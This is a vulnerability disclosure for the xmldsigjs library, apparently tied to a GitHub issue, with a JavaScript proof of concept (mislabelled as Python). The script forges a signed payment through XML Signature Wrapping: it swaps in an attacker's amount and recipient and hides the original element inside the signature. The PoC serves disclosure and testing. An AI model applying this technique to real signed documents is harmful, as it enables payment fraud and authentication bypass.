## Signature Validation Bypass via XML Signature Wrapping in xmldsigjs

<b>Reference:</b> https://github.com/PeculiarVentures/xmldsigjs/issues/88

<b>Proof-of-concept</b>

```python
import { Crypto } from '@peculiar/webcrypto';
import * as xmldsig from 'xmldsigjs';
import { setNodeDependencies, Parse } from 'xml-core';
import * as xmldom from '@xmldom/xmldom';
import xpath from 'xpath';

setNodeDependencies({
  DOMParser: xmldom.DOMParser,
  XMLSerializer: xmldom.XMLSerializer,
  DOMImplementation: xmldom.DOMImplementation,
  xpath,
});

const crypto = new Crypto();
xmldsig.Application.setEngine('NodeJS', crypto);

async function main() {
  const keyPair = await crypto.subtle.generateKey(
    {
      name: 'RSASSA-PKCS1-v1_5',
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: 'SHA-256',
    },
    true,
    ['sign', 'verify']
  );

  const originalDocument = `<Transaction>
  <Payment Id="payment-001">
    <Amount currency="USD">500.00</Amount>
    <Recipient>Bob</Recipient>
    <Reference>Invoice-12345</Reference>
  </Payment>
</Transaction>`;

  const doc = Parse(originalDocument);
  const signer = new xmldsig.SignedXml();

  await signer.Sign(
    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
    keyPair.privateKey,
    doc,
    {
      references: [
        { uri: '#payment-001', hash: 'SHA-256', transforms: ['exc-c14n'] }
      ]
    }
  );

  doc.documentElement.appendChild(signer.GetXml());
  const signedDocument = new xmldom.XMLSerializer().serializeToString(doc);

  const verifyDoc1 = Parse(signedDocument);
  const sig1 = verifyDoc1.getElementsByTagNameNS(
    'http://www.w3.org/2000/09/xmldsig#',
    'Signature'
  )[0];
  const verifier1 = new xmldsig.SignedXml(verifyDoc1);
  verifier1.LoadXml(sig1);

  await verifier1.Verify(keyPair.publicKey);

  const originalPayment = signedDocument.match(
    /<Payment Id="payment-001">[\s\S]*?<\/Payment>/
  )[0];

  let attackDocument = signedDocument.replace(
    originalPayment,
    `<Payment Id="payment-001">
    <Amount currency="USD">999999.99</Amount>
    <Recipient>Attacker</Recipient>
    <Reference>Invoice-12345</Reference>
  </Payment>`
  );

  attackDocument = attackDocument.replace(
    '</ds:Signature>',
    `<ds:Object Id="wrapped">${originalPayment}</ds:Object></ds:Signature>`
  );

  const verifyDoc2 = Parse(attackDocument);
  const sig2 = verifyDoc2.getElementsByTagNameNS(
    'http://www.w3.org/2000/09/xmldsig#',
    'Signature'
  )[0];
  const verifier2 = new xmldsig.SignedXml(verifyDoc2);
  verifier2.LoadXml(sig2);

  let attackValid;
  try {
    attackValid = await verifier2.Verify(keyPair.publicKey);
  } catch (e) {
    attackValid = false;
  }

  process.exit(attackValid ? 1 : 0);
}

main().catch(() => process.exit(2));
```
